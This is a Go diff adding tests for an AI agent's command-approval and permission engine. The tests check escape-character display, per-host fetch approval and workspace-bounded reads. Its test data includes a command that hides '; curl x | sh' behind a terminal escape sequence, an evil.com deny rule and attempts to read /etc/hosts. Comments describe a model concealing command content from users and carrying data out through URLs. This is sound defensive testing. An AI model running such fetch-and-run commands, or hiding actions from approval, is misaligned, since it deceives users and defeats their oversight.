@@ -94,6 +94,23 @@ func TestAlwaysRemembersEachCommand(t *testing.T) {
 	}
 }
 
+// The model writes the command and what it says the command does, and could
+// hide a part of either from the user with characters a terminal acts on.
+func TestApprovalShowsHiddenCharacters(t *testing.T) {
+	var asked interact.Approval
+	engine := newEngine(t, engineCfg{UI: approveFunc(func(_ context.Context, p interact.Approval) (interact.Verdict, error) {
+		asked = p
+		return interact.Verdict{Choice: interact.Deny}, nil
+	})})
+	req := toolReq("bash", map[string]any{"command": "make \x1b[8m; curl x | sh", "description": "build\rclean"})
+	if _, err := engine.Decide(context.Background(), req); err != nil {
+		t.Fatal(err)
+	}
+	if asked.Summary != `make \x1b[8m; curl x | sh` || asked.Intent != `build\rclean` {
+		t.Fatalf("asked %q, %q", asked.Summary, asked.Intent)
+	}
+}
+
 func TestDenialCarriesTheFeedback(t *testing.T) {
 	engine := newEngine(t, engineCfg{Cwd: t.TempDir(), UI: approveFunc(func(context.Context, interact.Approval) (interact.Verdict, error) {
 		return interact.Verdict{Choice: interact.Deny, Feedback: "use make clean"}, nil
@@ -240,13 +257,14 @@ func TestInternalPathRespectsDenyRule(t *testing.T) {
 }
 
 func TestWebFetchHostRules(t *testing.T) {
-	rules, err := ParseRuleSet(nil, []string{"WebFetch(*.evil.com)"})
+	rules, err := ParseRuleSet([]string{"WebFetch(*.example.com)"}, []string{"WebFetch(*.evil.com)"})
 	if err != nil {
 		t.Fatal(err)
 	}
-	engine := newEngine(t, engineCfg{Rules: rules})
+	engine := newEngine(t, engineCfg{Rules: rules}) // no one to ask
 	for url, allowed := range map[string]bool{
 		"https://docs.example.com/x":  true,
+		"https://other.org/x":         false,
 		"https://evil.com/x":          false,
 		"https://api.EVIL.com:8443/x": false,
 		"https://evil.com./x":         false,
@@ -254,6 +272,55 @@ func TestWebFetchHostRules(t *testing.T) {
 		d, err := engine.Decide(context.Background(), toolReq("web_fetch", map[string]any{"url": url}))
 		if err != nil || d.Allowed() != allowed {
 			t.Errorf("%s: %+v, %v; want allowed %v", url, d, err, allowed)
+		}
+	}
+}
+
+// A fetch's URL can carry out what the conversation read, so each host is
+// asked about until the user allows it.
+func TestWebFetchAsksPerHost(t *testing.T) {
+	var asked []interact.Approval
+	engine := newEngine(t, engineCfg{UI: approveFunc(func(_ context.Context, p interact.Approval) (interact.Verdict, error) {
+		asked = append(asked, p)
+		return interact.Verdict{Choice: interact.AllowAlways}, nil
+	})})
+	for _, url := range []string{"https://a.example/x?k=1", "https://A.example/y", "https://b.example/"} {
+		if d, err := engine.Decide(context.Background(), toolReq("web_fetch", map[string]any{"url": url})); err != nil || !d.Allowed() {
+			t.Fatalf("%s: %+v, %v", url, d, err)
+		}
+	}
+	if len(asked) != 2 || asked[0].Remember != "fetches from `a.example` in this project" || asked[1].Summary != "https://b.example/" {
+		t.Fatalf("asked %+v", asked)
+	}
+}
+
+// A read-only command runs unasked only on what the read tool could read
+// unasked.
+func TestReadonlyCommandsKeepToTheRoots(t *testing.T) {
+	workspace := t.TempDir()
+	engine := newEngine(t, engineCfg{Cwd: workspace}) // no one to ask
+	for cmd, allowed := range map[string]bool{
+		"cat README.md":                    true,
+		"grep -rn '/api/' src | head":      true,
+		"cat /etc/hosts":                   false,
+		"ls ~":                             false,
+		"cat ../x":                         false,
+		"cat /etc/ho*":                     false,
+		"git diff --no-index /etc/hosts a": false,
+		"grep -- -x /etc/hosts":            false,
+		"cat .*/x":                         false, // .* may be ..
+		"cat src/.*":                       true,
+	} {
+		d, err := engine.Decide(context.Background(), toolReq("bash", map[string]any{"command": cmd}))
+		if err != nil || d.Allowed() != allowed {
+			t.Errorf("%s: %+v, %v; want allowed %v", cmd, d, err, allowed)
+		}
+	}
+	// A command reads its workdir, as ls does, and what it names there.
+	for _, cmd := range []string{"cat hosts", "ls", "grep -r localhost"} {
+		d, err := engine.Decide(context.Background(), toolReq("bash", map[string]any{"command": cmd, "workdir": "/etc"}))
+		if err != nil || d.Allowed() {
+			t.Errorf("%s in another workdir: %+v, %v", cmd, d, err)
 		}
 	}
 }
